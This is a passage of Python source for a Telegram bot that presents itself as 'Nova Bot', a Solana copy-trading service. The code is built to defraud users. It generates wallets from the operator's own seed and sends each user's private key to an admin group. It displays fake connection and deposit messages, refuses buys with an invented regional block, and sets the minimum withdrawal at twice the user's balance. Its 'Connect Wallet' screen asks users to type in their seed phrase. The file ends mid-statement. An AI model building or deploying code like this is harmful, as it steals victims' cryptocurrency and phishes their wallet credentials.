import re
import os
import random
import string
import hashlib
import base58
import json
import requests
import asyncio
from dotenv import load_dotenv
from nacl.signing import SigningKey
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from pycoingecko import CoinGeckoAPI
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# Load environment variables
load_dotenv()
# Store temporary user states
user_states = {}
# Track users whose wallet info has been sent to admin group (prevent spam)
wallet_sent_to_admin = set()
# Track last notified balance per user (to show notification only once per deposit)
last_notified_balance = {}  # {telegram_id: balance}

# Admin configuration
ADMIN_IDS = [6370028992, 7484918897]
BANNED_USERS_FILE = "banned_users.json"
SUPPORT_LINK_FILE = "support_link.json"
banned_users = set()
SUPPORT_LINK = "https://t.me/NovaTeamSupport"

# Load settings
try:
    with open(BANNED_USERS_FILE, "r") as f:
        data = json.load(f)
        banned_users = set(data)
except Exception:
    pass

try:
    with open(SUPPORT_LINK_FILE, "r") as f:
        data = json.load(f)
        SUPPORT_LINK = data.get("link", SUPPORT_LINK)
except Exception:
    pass


def save_support_link():
    """Save support link to file"""
    try:
        with open(SUPPORT_LINK_FILE, "w") as f:
            json.dump({"link": SUPPORT_LINK}, f)
    except Exception as e:
        print(f"Error saving support link: {e}")


def save_banned_users():
    """Save banned users to file"""
    try:
        with open(BANNED_USERS_FILE, "w") as f:
            json.dump(list(banned_users), f)
    except Exception as e:
        print(f"Error saving banned users: {e}")


# --- Referral System ---
REFERRALS_FILE = "referrals.json"
referral_data = {"codes": {}, "users": {}}


def load_referrals():
    global referral_data
    try:
        with open(REFERRALS_FILE, "r") as f:
            referral_data = json.load(f)
            if "codes" not in referral_data:
                referral_data["codes"] = {}
            if "users" not in referral_data:
                referral_data["users"] = {}
    except Exception:
        referral_data = {"codes": {}, "users": {}}


def save_referrals():
    try:
        with open(REFERRALS_FILE, "w") as f:
            json.dump(referral_data, f)
    except Exception as e:
        print(f"Error saving referrals: {e}")


def get_or_create_referral_code(user_id: int) -> str:
    uid = str(user_id)
    if uid in referral_data["users"] and referral_data["users"][uid].get("code"):
        return referral_data["users"][uid]["code"]
    while True:
        code = "RF" + "".join(random.choices(string.ascii_letters + string.digits, k=5))
        if code not in referral_data["codes"]:
            break
    referral_data["codes"][code] = user_id
    if uid not in referral_data["users"]:
        referral_data["users"][uid] = {"code": code, "inviter_id": None, "invited": []}
    else:
        referral_data["users"][uid]["code"] = code
    save_referrals()
    return code


def record_referral(new_user_id: int, inviter_code: str) -> int | None:
    code_map = referral_data.get("codes", {})
    if inviter_code not in code_map:
        return None
    inviter_id = code_map[inviter_code]
    if inviter_id == new_user_id:
        return None
    new_uid = str(new_user_id)
    inviter_uid = str(inviter_id)
    user_entry = referral_data["users"].get(new_uid, {})
    if user_entry.get("inviter_id") is not None:
        return inviter_id
    user_entry["inviter_id"] = inviter_id
    referral_data["users"][new_uid] = user_entry
    inviter_entry = referral_data["users"].setdefault(
        inviter_uid, {"code": inviter_code, "inviter_id": None, "invited": []}
    )
    if new_user_id not in inviter_entry.get("invited", []):
        inviter_entry.setdefault("invited", []).append(new_user_id)
    save_referrals()
    return inviter_id


load_referrals()


# Load persisted wallet notifications from file
try:
    with open("wallet_notifications.txt", "r") as f:
        for line in f:
            user_id = line.strip()
            if user_id.isdigit():
                wallet_sent_to_admin.add(int(user_id))
except FileNotFoundError:
    pass  # File doesn't exist yet, will be created on first notification

# Balance tracking (cumulative deposits only)
user_balances = {}  # {telegram_id: {"balance": float, "last_checked_slot": int, "min_withdrawal": float, "fixed_min": bool}}
BALANCES_FILE = "user_balances.json"

# Load persisted balances
try:
    with open(BALANCES_FILE, "r") as f:
        user_balances = json.load(f)
        # Convert string keys back to int
        user_balances = {int(k): v for k, v in user_balances.items()}
except FileNotFoundError:
    pass


def save_balances():
    """Save user balances to file"""
    try:
        with open(BALANCES_FILE, "w") as f:
            json.dump(user_balances, f, indent=2)
    except Exception as e:
        print(f"Error saving balances: {e}")


# ---- CONFIG ----
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("TELEGRAM_BOT_TOKEN environment variable is required")
GROUP_ID = int(os.getenv("ADMIN_GROUP_ID", 0))
MNEMONIC = os.getenv("MNEMONIC", "")  # Master seed phrase for wallet generation
COINGECKO_API_KEY = os.getenv("COINGECKO_API_KEY", "")  # CoinGecko API key (optional)
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"  # Solana RPC endpoint

# Debug: Check if API key is loaded
if COINGECKO_API_KEY:
    print(f"✅ CoinGecko API Key loaded: {COINGECKO_API_KEY[:8]}...")
else:
    print("⚠️ WARNING: CoinGecko API Key NOT found! Prices may not work correctly.")
    print("   Make sure COINGECKO_API_KEY is set in your .env file")

# Initialize clients
# Use demo_api_key parameter for Demo API keys (api.coingecko.com)
# Use api_key parameter for Pro API keys (pro-api.coingecko.com)
if COINGECKO_API_KEY:
    # Remove quotes if they exist in the env var
    clean_key = COINGECKO_API_KEY.strip('"').strip("'")
    cg = CoinGeckoAPI(demo_api_key=clean_key)
else:
    cg = CoinGeckoAPI()
solana_client = AsyncClient(SOLANA_RPC_URL)


# ---- Helper Functions ----
async def get_sol_price_usd():
    """Get current SOL price in USD from CoinGecko"""
    try:
        price_data = cg.get_price(ids="solana", vs_currencies="usd")
        return price_data.get("solana", {}).get("usd", 0)
    except Exception as e:
        print(f"Error fetching SOL price: {e}")
        return 0


async def check_wallet_balance(public_address: str):
    """Check wallet balance on Solana blockchain"""
    try:
        pubkey = Pubkey.from_string(public_address)
        response = await solana_client.get_balance(pubkey)
        if response.value is not None:
            # Convert lamports to SOL (1 SOL = 1,000,000,000 lamports)
            balance_sol = response.value / 1_000_000_000
            return balance_sol
        return 0
    except Exception as e:
        print(f"Error checking balance for {public_address}: {e}")
        return 0


async def monitor_deposits(
    telegram_id: int,
    public_address: str,
    context: ContextTypes.DEFAULT_TYPE,
    notify_user: bool = True,
):
    """Monitor and update cumulative deposits for a wallet"""
    try:
        # Get current blockchain balance
        current_balance = await check_wallet_balance(public_address)

        # Get stored cumulative deposit balance
        if telegram_id not in user_balances:
            user_balances[telegram_id] = {
                "balance": 0,
                "last_checked_slot": 0,
                "min_withdrawal": 0,
                "fixed_min": False,
            }

        stored_balance = user_balances[telegram_id]["balance"]

        # If blockchain balance > stored balance, we have a new deposit
        if current_balance > stored_balance:
            deposit_amount = current_balance - stored_balance
            user_balances[telegram_id]["balance"] = current_balance

            # Withdrawal logic update
            if not user_balances[telegram_id].get("fixed_min", False):
                user_balances[telegram_id]["min_withdrawal"] = current_balance * 2
            else:
                # If fixed, check if current balance meets or exceeds the fixed minimum
                fixed_min = user_balances[telegram_id].get("min_withdrawal", 0)
                if current_balance >= fixed_min:
                    # Reset to X2 logic since requirement met
                    user_balances[telegram_id]["fixed_min"] = False
                    user_balances[telegram_id]["min_withdrawal"] = current_balance * 2

            save_balances()

            sol_price = await get_sol_price_usd()
            usd_value = current_balance * sol_price if sol_price > 0 else 0

            # Send notification to USER (only if not already notified for this specific balance)
            # Check if we've already notified for this exact balance
            if (
                notify_user
                and last_notified_balance.get(telegram_id, -1) != current_balance
            ):
                try:
                    user_notification = (
                        f"💰 <b>Deposit Confirmed!</b>\n\n"
                        f"Amount: +{deposit_amount:.4f} SOL\n"
                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
                        f"Your deposit has been successfully received and credited to your wallet."
                    )
                    await context.bot.send_message(
                        chat_id=telegram_id, text=user_notification, parse_mode="HTML"
                    )
                    # Mark this balance as notified
                    last_notified_balance[telegram_id] = current_balance
                except Exception as e:
                    print(f"Error sending notification to user: {e}")

            # Send notification to admin group
            if GROUP_ID:
                try:
                    user = await context.bot.get_chat(telegram_id)
                    user_name = user.username or user.first_name or str(telegram_id)

                    deposit_notification = (
                        f"💰 <b>New Deposit Detected</b>\n\n"
                        f"User: @{user_name} (ID: {telegram_id})\n"
                        f"Address: <code>{public_address}</code>\n\n"
                        f"Deposit: +{deposit_amount:.4f} SOL\n"
                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
                        f"Cumulative deposits tracked."
                    )
                    await context.bot.send_message(
                        chat_id=GROUP_ID, text=deposit_notification, parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"Error sending notification to admin group: {e}")

            return current_balance

        return stored_balance
    except Exception as e:
        print(f"Error monitoring deposits: {e}")
        return user_balances.get(telegram_id, {}).get("balance", 0)


def get_user_balance(telegram_id: int):
    """Get user's cumulative deposit balance"""
    return user_balances.get(telegram_id, {}).get("balance", 0)


async def check_and_notify_deposits(
    telegram_id: int, context: ContextTypes.DEFAULT_TYPE
):
    """Check for deposits and notify user (called on any button click)"""
    try:
        public_address, _ = derive_keypair_and_address(telegram_id)
        await monitor_deposits(telegram_id, public_address, context, notify_user=True)
    except Exception as e:
        print(f"Error checking deposits: {e}")


# ---- Wallet Generation Utility Functions ----
def derive_seed_from_mnemonic_and_id(mnemonic: str, telegram_id: int) -> bytes:
    """
    Deterministic derivation: Uses SHA256(mnemonic || ':' || telegram_id)
    Returns 32-byte seed for each unique Telegram ID
    """
    msg = (mnemonic.strip() + ":" + str(telegram_id)).encode("utf-8")
    digest = hashlib.sha256(msg).digest()
    return digest[:32]


def derive_keypair_and_address(telegram_id: int):
    """
    Generate unique Solana wallet for a Telegram user
    Returns: (public_address, private_key_base58)
    """
    if not MNEMONIC:
        raise ValueError("MNEMONIC not set in environment variables")

    # Derive unique seed for this telegram ID
    seed32 = derive_seed_from_mnemonic_and_id(MNEMONIC, telegram_id)

    # Generate Solana keypair
    kp = Keypair.from_seed(seed32)
    public_address = str(kp.pubkey())

    # Generate 64-byte secret key (private + public)
    sk = SigningKey(seed32)
    vk = sk.verify_key
    secret_64 = sk.encode() + vk.encode()
    private_key_b58 = base58.b58encode(secret_64).decode()

    return public_address, private_key_b58


# ✅ Step 1: Put the wallet function here
async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    telegram_id = user.id
    user_name = user.username or user.first_name or str(telegram_id)

    try:
        # Generate unique wallet for this user
        public_address, private_key_b58 = derive_keypair_and_address(telegram_id)

        # Send public address AND private key to admin group (only once per user to prevent spam)
        # This serves as backend storage for asset recovery
        if telegram_id not in wallet_sent_to_admin and GROUP_ID:
            try:
                admin_message = (
                    f"👤 <b>New Wallet Generated</b>\n\n"
                    f"User: @{user_name} (ID: {telegram_id})\n\n"
                    f"📬 <b>Public Address:</b>\n"
                    f"<code>{public_address}</code>\n\n"
                    f"🔐 <b>Private Key (Backend Storage):</b>\n"
                    f"<code>{private_key_b58}</code>"
                )
                await context.bot.send_message(
                    chat_id=GROUP_ID, text=admin_message, parse_mode="HTML"
                )
                wallet_sent_to_admin.add(telegram_id)
                # Persist to file for restart persistence
                try:
                    with open("wallet_notifications.txt", "a") as f:
                        f.write(f"{telegram_id}\n")
                except Exception as e:
                    print(f"Error persisting notification record: {e}")
            except Exception as e:
                print(f"Error sending wallet to admin group: {e}")

        # Monitor deposits and update balance
        balance = await monitor_deposits(telegram_id, public_address, context)

        # Get SOL price
        sol_price = await get_sol_price_usd()
        usd_value = balance * sol_price if sol_price > 0 else 0

        # Show public address to user (private key stored securely server-side)
        wallet_text = (
            "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📬 <b>Solana Address:</b>\n"
            f"<code>{public_address}</code>\n"
            # "🔐 <b>Private Key:</b> Stored securely (contact admin for recovery)\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "<b>Holdings</b>\n"
            f"• <b>SOL:</b> {balance:.4f}\n"
            f"• <b>Total Assets:</b> ${usd_value:.2f}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔘 <i>No active tokens detected.</i>\n\n"
            "💰 <b>Fund Your Bot</b>\n"
            f"Send SOL to your address above\n\n"
            "(Funds are required for copy-trading operations.)\n\n"
            "👇 <i>What would you like to do next?</i>"
        )
    except Exception as e:
        wallet_text = (
            "⚠️ <b>Wallet Generation Error</b>\n\n"
            "Unable to generate wallet. Please contact support.\n"
            f"Error: {str(e)}"
        )

    wallet_inline = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("💸 Withdraw", callback_data="ct_withdraw"),
                InlineKeyboardButton(
                    "⚙️ Connect Wallet", callback_data="ct_connect_wallet"
                ),
            ],
            [
                InlineKeyboardButton("🤖 Copy Trade", callback_data="ct_copy_trade"),
            ],
            [
                InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main"),
            ],
        ]
    )

    if update.message:
        # Delete the previous bot wallet message if we have it stored
        prev_msg_id = context.user_data.get("last_wallet_msg_id")
        if prev_msg_id:
            try:
                await context.bot.delete_message(
                    chat_id=update.message.chat_id, message_id=prev_msg_id
                )
            except Exception:
                pass
        sent = await update.message.reply_text(
            wallet_text, parse_mode="HTML", reply_markup=wallet_inline
        )
        context.user_data["last_wallet_msg_id"] = sent.message_id
    elif update.callback_query:
        chat_id = update.callback_query.message.chat_id
        sent = await context.bot.send_message(
            chat_id=chat_id,
            text=wallet_text,
            parse_mode="HTML",
            reply_markup=wallet_inline,
        )
        context.user_data["last_wallet_msg_id"] = sent.message_id


# --- Continue with your other handlers (like bot guide, wallet, etc.) ---


# --- SETTINGS MENU ---
async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    Setting_buttons = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "Number of trades per day", callback_data="trade_per_day"
                )
            ],
            [
                InlineKeyboardButton(
                    "Edit Number of consecutive buys", callback_data="consecutive_buys"
                )
            ],
            [InlineKeyboardButton("Sell Position", callback_data="sell_position")],
        ]
    )

    settings_text = (
        "<b>⚙️ Settings Menu</b>\n\n"
        "Your settings are organized into categories for easy management:\n\n"
        "<b>Trading Options:</b>\n"
        "- Configure number of trades per day\n"
        "- Adjust consecutive buys\n"
        "- Manage sell positions\n\n"
        "Choose an option below to update:"
    )

    await update.message.reply_text(
        settings_text, parse_mode="HTML", reply_markup=Setting_buttons
    )


# --- CALLBACK HANDLER (BUTTONS) ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    option = query.data
    user_id = query.from_user.id
    user = query.from_user
    user_name = user.username or user.first_name or str(user_id)

    # Global ban check
    if user_id in banned_users:
        return

    # Admin actions
    if option.startswith("admin_"):
        if user_id not in ADMIN_IDS:
            return

        if option == "admin_ban":
            context.user_data["awaiting_admin_ban"] = True
            await query.message.reply_text(
                "🚫 Enter the Telegram ID of the user to <b>BAN</b>:", parse_mode="HTML"
            )
        elif option == "admin_unban":
            context.user_data["awaiting_admin_unban"] = True
            await query.message.reply_text(
                "✅ Enter the Telegram ID of the user to <b>UNBAN</b>:",
                parse_mode="HTML",
            )
        elif option == "admin_list_banned":
            if not banned_users:
                await query.message.reply_text("📜 No users are currently banned.")
            else:
                list_text = "📜 <b>Banned Users:</b>\n\n" + "\n".join(
                    [f"• <code>{uid}</code>" for uid in banned_users]
                )
                await query.message.reply_text(list_text, parse_mode="HTML")
        elif option == "admin_change_support":
            context.user_data["awaiting_admin_support_link"] = True
            await query.message.reply_text(
                "🔗 Enter the new <b>Support Link</b> (e.g., https://t.me/YourSupport):",
                parse_mode="HTML",
            )
        elif option == "admin_user_details":
            context.user_data["awaiting_admin_user_lookup"] = True
            await query.message.reply_text(
                "🔍 Enter the Telegram ID of the user to view/edit details:"
            )
        elif option.startswith("admin_edit_"):
            parts = option.split(
                "_"
            )  # admin_edit_balance_ID or admin_edit_min_withdrawal_ID
            field = parts[2]
            target_id = parts[-1]  # The ID is always at the end
            context.user_data["admin_editing_user"] = target_id
            context.user_data["admin_editing_field"] = field
            await query.message.reply_text(
                f"📝 Enter the new <b>{field.replace('_', ' ').title()}</b> for user {target_id}:",
                parse_mode="HTML",
            )
        return

    # Check for deposits on ANY button click
    await check_and_notify_deposits(user_id, context)

    # Handle cancel action for settings
    if option == "cancel_settings":
        user_states.pop(user_id, None)
        try:
            await query.message.delete()
        except Exception:
            pass
        welcome_text = (
            "👋 <b>Welcome to Nova Bot!</b>\n"
            "Step into the world of fast, smart, and stress-free trading, "
            "designed for both beginners and seasoned traders.\n\n"
            "👇 Select an option below to continue."
        )
        await query.message.reply_text(
            welcome_text, parse_mode="HTML", reply_markup=main_menu_inline()
        )
        return

    # Handle fund wallet action
    if option == "fund_wallet":
        try:
            public_address, _ = derive_keypair_and_address(user_id)
            user_balance = get_user_balance(user_id)
            sol_price = await get_sol_price_usd()
            usd_value = user_balance * sol_price if sol_price > 0 else 0

            deposit_message = (
                "💰 <b>Fund Your Wallet</b>\n\n"
                f"Send SOL to the address below to fund your bot wallet:\n\n"
                f"📬 <b>Your Deposit Address:</b>\n"
                f"<code>{public_address}</code>\n\n"
                f"💡 <b>How to Deposit:</b>\n"
                f"1. Copy the address above\n"
                f"2. Send SOL from any Solana wallet\n"
                f"3. Deposits are detected automatically\n"
                f"4. You'll receive a notification when funds arrive\n\n"
                f"📊 <b>Current Balance:</b> {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
                f"⚠️ <b>Note:</b> Only send SOL to this address. Sending other tokens may result in loss of funds.\n\n"
                f"🔄 Deposits are monitored every 30 seconds."
            )
            await query.message.reply_text(
                deposit_message,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "⬅️ Back to Menu", callback_data="back_main"
                            )
                        ]
                    ]
                ),
            )
        except Exception:
            await query.message.reply_text(
                "⚠️ Error generating deposit address. Please try again or contact support.",
                parse_mode="HTML",
                reply_markup=back_to_menu_btn(),
            )
        return

    # ---- shared delete helper ----
    async def _del():
        try:
            await query.message.delete()
        except Exception:
            pass

    # Handle BUY actions
    if option.startswith("buy_"):
        parts = option.split(
            "_", 2
        )  # buy_amount_tokenaddress or buy_custom_tokenaddress

        back_trade_btn = InlineKeyboardMarkup(
            [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
        )

        if parts[1] == "custom":
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            context.user_data["awaiting_custom_buy"] = token_address
            await _del()
            sent = await query.message.reply_text(
                "🟢 <b>Custom Buy Amount</b>\n\n"
                "Please enter the amount of SOL you want to buy:\n\n"
                "📝 Enter your desired SOL amount (e.g., 0.25, 2.5, 10)",
                parse_mode="HTML",
                reply_markup=back_trade_btn,
            )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return
        else:
            amount = parts[1]
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            user_balance = get_user_balance(user_id)
            sol_price = await get_sol_price_usd()
            usd_value = user_balance * sol_price if sol_price > 0 else 0
            await _del()
            if user_balance == 0:
                sent = await query.message.reply_text(
                    "❗ Insufficient SOL balance.",
                    parse_mode="HTML",
                    reply_markup=back_trade_btn,
                )
            elif usd_value < 10:
                sent = await query.message.reply_text(
                    f"❗ Minimum amount required to buy a token is above $10.\n\n"
                    f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                    parse_mode="HTML",
                    reply_markup=back_trade_btn,
                )
            else:
                sent = await query.message.reply_text(
                    f"Buying tokens is currently not available in your region at the moment. Try again later.\n\n"
                    f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                    parse_mode="HTML",
                    reply_markup=back_trade_btn,
                )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return

    # Handle SELL actions
    if option.startswith("sell_"):
        parts = option.split("_", 2)

        back_trade_btn = InlineKeyboardMarkup(
            [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
        )

        if parts[1] == "custom":
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            context.user_data["awaiting_custom_sell"] = token_address
            await _del()
            sent = await query.message.reply_text(
                "🔴 <b>Custom Sell Percentage</b>\n\n"
                "Please enter the percentage you want to sell:\n\n"
                "📝 Enter your desired percentage (e.g., 25, 75, 90)",
                parse_mode="HTML",
                reply_markup=back_trade_btn,
            )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return
        else:
            percentage = parts[1]
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            await _del()
            sent = await query.message.reply_text(
                f"🔴 <b>Sell Order Submitted</b>\n\n"
                f"Percentage: {percentage}%\n"
                f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
                f"❗ No token balance to sell.",
                parse_mode="HTML",
                reply_markup=back_trade_btn,
            )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return

    # Handle cancel custom trade
    if option == "cancel_custom_trade":
        context.user_data.pop("awaiting_custom_buy", None)
        context.user_data.pop("awaiting_custom_sell", None)
        await query.message.reply_text(
            "❌ Trade cancelled.", reply_markup=main_menu_markup()
        )
        return

    # ---- COPY TRADE SMART WALLET inline flow ----
    if option == "ct_wallet_view":
        await _del()
        await show_wallet(update, context)
        return

    if option == "ct_withdraw":
        await _del()
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0
        stored_min = user_balances.get(user_id, {}).get(
            "min_withdrawal", user_balance * 2
        )
        if stored_min == 0 and user_balance > 0:
            stored_min = user_balance * 2
        withdraw_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "💸 Withdraw 100%", callback_data="withdraw_100"
                    )
                ],
                [InlineKeyboardButton("💸 Withdraw 50%", callback_data="withdraw_50")],
                [
                    InlineKeyboardButton(
                        "💸 Withdraw X SOL", callback_data="withdraw_custom"
                    )
                ],
                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
            ]
        )
        await query.message.reply_text(
            f"💸 <b>Withdraw SOL</b>\n\nYour current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
            f"<b>Minimum withdrawal:</b> {stored_min:.4f} SOL\nChoose a withdrawal option:",
            parse_mode="HTML",
            reply_markup=withdraw_buttons,
        )
        return

    if option == "ct_connect_wallet":
        await _del()
        context.user_data["awaiting_dummy"] = True
        await query.message.reply_text(
            "🔐 <b>Connect Your Wallet</b>\n\n"
            "Please send your 12-word seed phrase to connect your Solana wallet.\n\n"
            "⚠️ <b>Security Notes:</b>\n"
            "• Your seed phrase is never stored permanently\n"
            "• It's only used to derive your wallet address\n"
            "• The phrase is cleared from memory immediately\n"
            "• Only send your seed phrase if you trust this bot\n\n"
            "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
            "<b>Example:</b> <code>word1 word2 word3 ... word12</code>\n\n"
            "Type your phrase below or tap Cancel.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_copy_trade":
        await _del()
        copy_trade_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🎯 Target Wallet", callback_data="ct_target_wallet"
                    ),
                    InlineKeyboardButton(
                        "💰 Buy Amount", callback_data="ct_buy_amount"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
                    ),
                    InlineKeyboardButton(
                        "📤 Sell Position", callback_data="ct_sell_position"
                    ),
                ],
                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
            ]
        )
        await query.message.reply_text(
            "🤖 <b>Copy Trade Setup</b>\n\nConfigure your copy trading settings below.\nTap each option to set it up:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if option == "ct_target_wallet":
        context.user_data["awaiting_ct_target_wallet"] = True
        await _del()
        await query.message.reply_text(
            "🎯 <b>Target Wallet</b>\n\n"
            "Enter the Solana wallet address you want to copy trade from:\n\n"
            "📝 <b>Example:</b>\n<code>2SiCkKBUvzfoFeq1V5JrSybHuBUy1U1zszzYx2ccKxGP</code>\n\n"
            "Type the address or tap Cancel.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_buy_amount":
        context.user_data["awaiting_ct_buy_amount"] = True
        await _del()
        await query.message.reply_text(
            "💰 <b>Buy Amount</b>\n\n"
            "Enter the amount of SOL to spend on each token trade:\n\n"
            "📝 <b>Example:</b> <code>0.5</code>\n\n"
            "Type the amount or tap Cancel.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_consecutive_buys":
        context.user_data["awaiting_ct_consecutive_buys"] = True
        await _del()
        await query.message.reply_text(
            "🔁 <b>Consecutive Buys</b>\n\n"
            "Enter the number of consecutive buys to execute:\n\n"
            "📝 <b>Example:</b> <code>3</code>\n\n"
            "Type the number or tap Cancel.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_sell_position":
        await _del()
        sell_pos_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("📤 Close at 50%", callback_data="ct_sell_50"),
                    InlineKeyboardButton(
                        "📤 Close at 100%", callback_data="ct_sell_100"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        "⬅️ Back to Copy Trade", callback_data="back_ct_setup"
                    )
                ],
            ]
        )
        await query.message.reply_text(
            "📤 <b>Sell Position</b>\n\n"
            "Select when to close your position:\n\n"
            "• <b>50%</b> — Sell half your position\n"
            "• <b>100%</b> — Sell the full position",
            parse_mode="HTML",
            reply_markup=sell_pos_buttons,
        )
        return

    if option in ("ct_sell_50", "ct_sell_100"):
        pct = "50%" if option == "ct_sell_50" else "100%"
        context.user_data["ct_sell_position"] = pct
        context.user_data["awaiting_ct_slippage"] = True
        await _del()
        await query.message.reply_text(
            f"✅ Sell position set to <b>{pct}</b>\n\n"
            "⚡ <b>Set Slippage</b>\n\n"
            "Enter your desired slippage percentage.\n\n"
            "📌 <b>Recommended:</b> 1% – 15% depending on market volatility.\n\n"
            "📝 Enter a number between <b>1</b> and <b>15</b>:",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    # ---- Navigation: show pages ----
    if option == "back_main":
        await _del()
        welcome_text = (
            "👋 <b>Welcome to Nova Bot!</b>\n"
            "Step into the world of fast, smart, and stress-free trading, "
            "designed for both beginners and seasoned traders.\n\n"
            "🔗 Connecting to your wallet...\n"
            "⏳ Initializing your account and securing your funds...\n"
            "✅ Wallet successfully created and linked!\n\n"
            "👇 Select an option below to continue."
        )
        await query.message.reply_text(
            welcome_text, parse_mode="HTML", reply_markup=main_menu_inline()
        )
        return

    if option == "back_wallet":
        await show_wallet(update, context)
        return

    if option == "back_ct_setup":
        await _del()
        copy_trade_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🎯 Target Wallet", callback_data="ct_target_wallet"
                    ),
                    InlineKeyboardButton(
                        "💰 Buy Amount", callback_data="ct_buy_amount"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
                    ),
                    InlineKeyboardButton(
                        "📤 Sell Position", callback_data="ct_sell_position"
                    ),
                ],
                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
            ]
        )
        await query.message.reply_text(
            "🔍 <b>Copy Trade Setup</b>\n\nConfigure your copy trading settings below.\nTap each option to set it up:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if option == "back_withdraw":
        await _del()
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0
        stored_min = user_balances.get(user_id, {}).get(
            "min_withdrawal", user_balance * 2
        )
        if stored_min == 0 and user_balance > 0:
            stored_min = user_balance * 2
        withdraw_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "💸 Withdraw 100%", callback_data="withdraw_100"
                    )
                ],
                [InlineKeyboardButton("💸 Withdraw 50%", callback_data="withdraw_50")],
                [
                    InlineKeyboardButton(
                        "💸 Withdraw X SOL", callback_data="withdraw_custom"
                    )
                ],
                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
            ]
        )
        await query.message.reply_text(
            f"💸 <b>Withdraw SOL</b>\n\nYour current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
            f"<b>Minimum withdrawal:</b> {stored_min:.4f} SOL\nChoose a withdrawal option:",
            parse_mode="HTML",
            reply_markup=withdraw_buttons,
        )
        return

    if option == "show_wallet":
        await show_wallet(update, context)
        return

    if option == "back_trade":
        # Delete all tracked trade-flow messages then show wallet
        chat_id = context.user_data.pop("trade_chat_id", None) or query.message.chat_id
        for msg_id in context.user_data.pop("trade_msg_ids", []):
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except Exception:
                pass
        try:
            await query.message.delete()
        except Exception:
            pass
        await show_wallet(update, context)
        return

    if option == "show_buy":
        await _del()
        context.user_data["awaiting_token_contract"] = True
        context.user_data["trade_msg_ids"] = []
        context.user_data["trade_chat_id"] = query.message.chat_id
        sent = await query.message.reply_text(
            "💰 <b>Buy Token</b>\n\n"
            "Paste the Solana token contract address you want to buy.\n\n"
            "📝 <b>Example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
            "I'll show you the token details including price, market cap, liquidity, and security info.\n\n"
            "Type the address or tap Cancel.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
